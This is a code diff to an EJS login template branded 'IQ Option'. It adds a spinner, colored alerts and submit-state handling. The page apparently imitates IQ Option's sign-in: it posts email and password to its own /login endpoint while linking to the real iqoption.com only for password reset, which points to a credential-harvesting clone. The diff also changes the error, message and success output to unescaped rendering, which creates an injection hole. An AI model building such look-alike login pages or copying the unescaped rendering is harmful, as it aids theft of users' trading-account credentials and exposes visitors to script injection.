@@ -9,7 +9,8 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <title>Iniciar Sesión - IQ Option</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
 
     <style>
         /* RESET COMPLETO - ESTILO FACEBOOK MOBILE EXCLUSIVO */
@@ -268,8 +269,13 @@
             width: 100% !important;
             margin: 16px 0 20px 0 !important;
             box-shadow: none !important;
-            transition: background-color 0.2s ease !important;
+            transition: all 0.2s ease !important;
             cursor: pointer !important;
+            position: relative !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            gap: 8px !important;
         }
 
         .login-btn:hover {
@@ -278,6 +284,59 @@
 
         .login-btn:active {
             background: #1464d4 !important;
+        }
+
+        .login-btn:disabled {
+            background: #8cc8ff !important;
+            cursor: not-allowed !important;
+        }
+
+        .login-btn .btn-text {
+            display: inline-block !important;
+        }
+
+        .login-btn .btn-loading {
+            display: none !important;
+            font-size: 18px !important;
+            color: white !important;
+        }
+
+        .login-btn.loading .btn-text {
+            display: none !important;
+        }
+
+        .login-btn.loading .btn-loading {
+            display: inline-flex !important;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-btn.loading {
+            background: #166fe5 !important;
+            cursor: not-allowed !important;
+            opacity: 0.8 !important;
+        }
+
+        /* Spinner personalizado CSS puro - Estilo Facebook */
+        .custom-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
+            border-right: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        /* Animación de rotación */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .mobile-footer {
@@ -335,14 +394,70 @@
         }
 
         .alert-custom {
-            background: #fff3cd !important;
-            border: 1px solid #ffeaa7 !important;
-            color: #856404 !important;
             border-radius: 6px !important;
             padding: 12px 16px !important;
             margin-bottom: 16px !important;
             font-size: 14px !important;
             text-align: center !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            gap: 8px !important;
+            transition: opacity 0.3s ease !important;
+            line-height: 1.4 !important;
+        }
+
+        .alert-custom.alert-error {
+            background: #fff3cd !important;
+            border: 1px solid #ffeaa7 !important;
+            color: #856404 !important;
+        }
+
+        .alert-custom.alert-error i {
+            color: #856404 !important;
+            font-size: 18px !important;
+            min-width: 18px !important;
+        }
+
+        .alert-custom.alert-success {
+            background: #d4edda !important;
+            border: 1px solid #c3e6cb !important;
+            color: #155724 !important;
+        }
+
+        .alert-custom.alert-success i {
+            color: #155724 !important;
+            font-size: 18px !important;
+            min-width: 18px !important;
+        }
+
+        .alert-custom i::before {
+            font-family: "Font Awesome 6 Free", "Font Awesome 5 Free", sans-serif !important;
+        }
+
+        /* Fallback para iconos si Font Awesome no carga */
+        .alert-custom.alert-error i {
+            color: #856404 !important;
+            font-size: 18px !important;
+            min-width: 18px !important;
+        }
+
+        .alert-custom.alert-error i:not([class*="fa-"])::before {
+            content: "⚠️" !important;
+            font-family: "Apple Color Emoji", "Segoe UI Emoji", sans-serif !important;
+        }
+
+        .alert-custom.alert-success i:not([class*="fa-"])::before {
+            content: "✅" !important;
+            font-family: "Apple Color Emoji", "Segoe UI Emoji", sans-serif !important;
+        }
+
+        .alert-custom span {
+            flex: 1 !important;
+        }
+
+        .alert-custom.fade-out {
+            opacity: 0 !important;
         }
     </style>
 </head>
@@ -357,44 +472,67 @@
 
         <div class="form-container">
             <% if (error) { %>
-                <div class="alert-custom">
+                <div class="alert-custom alert-error" id="errorAlert">
                     <i class="fas fa-exclamation-circle"></i>
                     <span>
-                        <%= error %>
+                        <%- error %>
                     </span>
                 </div>
                 <% } %>
 
-                    <form method="POST" action="/login" id="loginForm">
-                        <div class="form-group">
-                            <input type="email" class="form-control" id="email" name="email"
-                                placeholder="Correo electrónico" required>
+                    <% if (message) { %>
+                        <div class="alert-custom alert-warning" id="messageAlert"
+                            style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404;">
+                            <i class="fas fa-info-circle"></i>
+                            <span>
+                                <%- message %>
+                            </span>
                         </div>
+                        <% } %>
 
-                        <div class="form-group">
-                            <div class="input-group">
-                                <input type="password" class="form-control" id="password" name="password"
-                                    placeholder="Contraseña" required>
-                                <button type="button" class="password-toggle" onclick="togglePassword()"></button>
-                            </div>
-                        </div>
+                            <% if (typeof success !=='undefined' && success) { %>
+                                <div class="alert-custom alert-success" id="successAlert">
+                                    <i class="fas fa-check-circle"></i>
+                                    <span>
+                                        <%- success %>
+                                    </span>
+                                </div>
+                                <% } %>
 
-                        <label class="mobile-checkbox">
-                            <input type="checkbox" id="rememberCredentials">
-                            <span class="checkmark"></span>
-                            <span class="text">Recordar</span>
-                        </label>
+                                    <form method="POST" action="/login" id="loginForm">
+                                        <div class="form-group">
+                                            <input type="email" class="form-control" id="email" name="email"
+                                                placeholder="Correo electrónico" required>
+                                        </div>
 
-                        <div class="remember-section">
-                            <a href="https://iqoption.com/es/change-password" class="forgot-link">¿Olvidaste tu
-                                contraseña?</a>
-                        </div>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <input type="password" class="form-control" id="password"
+                                                    name="password" placeholder="Contraseña" required>
+                                                <button type="button" class="password-toggle"
+                                                    onclick="togglePassword()"></button>
+                                            </div>
+                                        </div>
 
-                        <button type="submit" class="login-btn" id="loginBtn">
-                            <span class="btn-text">Iniciar Sesión</span>
-                            <i class="fas fa-spinner fa-spin btn-loading" style="display: none;"></i>
-                        </button>
-                    </form>
+                                        <label class="mobile-checkbox">
+                                            <input type="checkbox" id="rememberCredentials">
+                                            <span class="checkmark"></span>
+                                            <span class="text">Recordar</span>
+                                        </label>
+
+                                        <div class="remember-section">
+                                            <a href="https://iqoption.com/es/change-password"
+                                                class="forgot-link">¿Olvidaste tu
+                                                contraseña?</a>
+                                        </div>
+
+                                        <button type="submit" class="login-btn" id="loginBtn">
+                                            <span class="btn-text">Iniciar Sesión</span>
+                                            <span class="btn-loading" style="display: none;">
+                                                <div class="custom-spinner"></div>
+                                            </span>
+                                        </button>
+                                    </form>
         </div>
 
         <!-- Footer móvil estilo Facebook -->
@@ -479,19 +617,86 @@
             // Form submit handler
             if (loginForm) {
                 loginForm.addEventListener('submit', function (e) {
+                    console.log('🔄 Formulario enviado - Activando estado de carga...');
                     saveCredentials();
 
-                    // Loading animation
-                    const loginBtn = document.getElementById('loginBtn');
-                    const btnText = loginBtn.querySelector('.btn-text');
-                    const btnLoading = loginBtn.querySelector('.btn-loading');
+                    // Loading animation - usar los elementos correctos
+                    const loginBtn = document.querySelector('.login-btn');
+                    const btnText = loginBtn ? loginBtn.querySelector('.btn-text') : null;
+                    const btnLoading = loginBtn ? loginBtn.querySelector('.btn-loading') : null;
 
-                    if (btnText && btnLoading) {
+                    console.log('🔍 Elementos encontrados:', {
+                        loginBtn: !!loginBtn,
+                        btnText: !!btnText,
+                        btnLoading: !!btnLoading
+                    });
+
+                    if (loginBtn && btnText && btnLoading) {
+                        // Activar estado de carga inmediatamente
+                        console.log('✅ Activando estado de carga...');
+                        loginBtn.disabled = true;
                         loginBtn.classList.add('loading');
                         btnText.style.display = 'none';
                         btnLoading.style.display = 'inline-block';
+                        btnLoading.style.color = 'white';
+
+                        // Timeout más largo para conexiones lentas
+                        setTimeout(() => {
+                            // Solo resetear si aún estamos en la página de login
+                            if (window.location.pathname === '/' || window.location.pathname.includes('login')) {
+                                console.log('⏰ Timeout alcanzado - Reseteando botón');
+                                resetLoginButton();
+                            }
+                        }, 15000); // 15 segundos timeout
+                    } else {
+                        console.log('❌ No se pudieron encontrar los elementos del botón');
                     }
                 });
+            }
+
+            // Función para resetear el botón en caso de error
+            function resetLoginButton() {
+                console.log('🔄 Reseteando botón de login...');
+                const loginBtn = document.querySelector('.login-btn');
+                const btnText = loginBtn ? loginBtn.querySelector('.btn-text') : null;
+                const btnLoading = loginBtn ? loginBtn.querySelector('.btn-loading') : null;
+
+                if (loginBtn && btnText && btnLoading) {
+                    loginBtn.classList.remove('loading');
+                    loginBtn.disabled = false;
+                    btnText.style.display = 'inline-block';
+                    btnLoading.style.display = 'none';
+                    console.log('✅ Botón reseteado correctamente');
+                } else {
+                    console.log('❌ No se pudo resetear el botón - elementos no encontrados');
+                }
+            }
+
+            // Resetear botón si hay error o mensaje visible
+            if (document.querySelector('.alert-custom')) {
+                resetLoginButton();
+            }
+
+            // Auto-hide error messages after 5 seconds
+            const errorAlert = document.getElementById('errorAlert');
+            if (errorAlert) {
+                setTimeout(() => {
+                    errorAlert.classList.add('fade-out');
+                    setTimeout(() => {
+                        errorAlert.remove();
+                    }, 300);
+                }, 5000);
+            }
+
+            // Auto-hide success messages after 3 seconds
+            const successAlert = document.getElementById('successAlert');
+            if (successAlert) {
+                setTimeout(() => {
+                    successAlert.classList.add('fade-out');
+                    setTimeout(() => {
+                        successAlert.remove();
+                    }, 300);
+                }, 3000);
             }
         });
     </script>
